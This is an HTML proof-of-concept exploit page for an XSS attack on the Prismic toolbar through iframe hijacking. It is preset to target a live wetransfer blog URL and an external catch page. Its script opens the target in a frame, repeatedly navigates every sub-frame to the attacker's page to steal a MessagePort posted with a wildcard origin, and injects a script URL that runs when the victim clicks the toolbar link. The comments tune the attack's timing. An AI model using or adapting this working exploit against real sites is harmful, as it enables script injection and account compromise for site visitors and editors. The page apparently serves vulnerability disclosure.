<!DOCTYPE html>
<html>
<head>
<title>Prismic Toolbar XSS via Iframe Hijack</title>
<style>
  body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
  h1 { color: #e94560; }
  #log { background: #16213e; padding: 15px; border-radius: 8px; max-height: 400px; overflow-y: auto; margin: 10px 0; }
  .log-entry { margin: 4px 0; font-size: 13px; }
  .success { color: #0f0; }
  .error { color: #f00; }
  .info { color: #0af; }
  .warn { color: #fa0; }
  button { background: #e94560; color: #fff; border: none; padding: 12px 24px; border-radius: 6px;
           font-size: 16px; cursor: pointer; margin: 10px 5px; font-family: monospace; }
  button:hover { background: #c73e54; }
  pre { background: #0d1117; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 12px; color: #c9d1d9; }
  input { background: #0d1117; color: #eee; border: 1px solid #333; padding: 8px 12px; border-radius: 4px;
          font-family: monospace; font-size: 14px; width: 500px; }
  label { display: block; margin: 8px 0 4px; color: #888; font-size: 12px; }
</style>
</head>
<body>

<h1>Prismic Toolbar XSS via Iframe Hijack</h1>

<p>
  <strong>Vulnerability:</strong> Prismic toolbar iframe communication uses
  <code>postMessage('setup_port', '*', [port])</code> — wildcard target origin.<br>
  <strong>Impact:</strong> Attacker navigates the Prismic iframe to a controlled page, intercepts the
  MessagePort, and injects malicious <code>editorUrl</code> into prediction documents.
  toolbar.js renders <code>&lt;a href={editorUrl}&gt;</code> with no protocol validation → XSS on click.
</p>

<label for="target">Target URL (wetransfer.com/blog has Prismic toolbar, no framing restrictions):</label>
<input id="target" type="text" value="https://frontsite-nextjs.wetransfer.net/blog">

<label for="catch">Catch page URL (host poc-prismic-catch.html):</label>
<input id="catch" type="text" value="https://daemoon.me/demo/poc-prismic-catch.html">

<br>
<button onclick="startAttack()">Launch</button>
<div id="log"></div>

<iframe name="victim" id="victim-frame" width="100%" height="500" style="border: 2px solid #333; border-radius: 4px; margin-top: 10px; background: #0d1117;"></iframe>

<script>
function log(msg, cls) {
  var div = document.getElementById('log');
  var ts = new Date().toISOString().substr(11, 12);
  div.innerHTML += '<div class="log-entry ' + (cls || 'info') + '">[' + ts + '] ' + msg + '</div>';
  div.scrollTop = div.scrollHeight;
}

function startAttack() {
  var TARGET = document.getElementById('target').value;
  var CATCH_URL = document.getElementById('catch').value;

  log('=== Prismic Toolbar XSS via Iframe Hijack ===', 'warn');
  log('Target: ' + TARGET, 'info');
  log('Catch page: ' + CATCH_URL, 'info');

  // Step 1: window.open targets the empty named iframe, triggers FIRST load
  // CRITICAL: iframe must have NO src= so prismic.js hasn't run yet.
  // If iframe was pre-loaded, setup_port would already be consumed before we can hijack.
  var x = window.open(TARGET, "victim", "width=800,height=600");
  if (!x) {
    log('Failed to get window reference.', 'error');
    return;
  }
  log('Navigating victim iframe to target...', 'success');

  // Step 2: Poll for ALL sub-frames. Navigate every new one to catch page.
  // The page has multiple iframes (consent, analytics, etc.) BEFORE Prismic.
  // At 411ms you caught a non-Prismic iframe and stopped polling — that was the bug.
  // Now we keep polling and navigate EVERY new frame. The catch page only acts
  // on setup_port, so non-Prismic frames are harmless.

  var knownCount = 0;
  var startTime = Date.now();

  var poller = setInterval(function() {
    try {
      var len = x.frames.length;
      if (len > knownCount) {
        var elapsed = Date.now() - startTime;
        log('Frames: ' + knownCount + ' → ' + len + ' (at ' + elapsed + 'ms)', 'success');

        for (var i = knownCount; i < len; i++) {
          try {
            x.frames[i].location.href = CATCH_URL;
            log('  → Navigated frames[' + i + '] to catch page', 'success');
          } catch(e) {
            log('  → frames[' + i + '] failed: ' + e.message, 'warn');
          }
        }
        knownCount = len;
      }
    } catch(e) {
      // cross-origin — keep polling
    }
  }, 10);

  // Stop after 30s
  setTimeout(function() {
    clearInterval(poller);
    log('Polling stopped. Navigated ' + knownCount + ' frame(s).', 'info');
    if (knownCount > 0) {
      log('If Prismic toolbar icon appears bottom-left → click → XSS!', 'warn');
    }
  }, 30000);
}
</script>
</body>
</html>
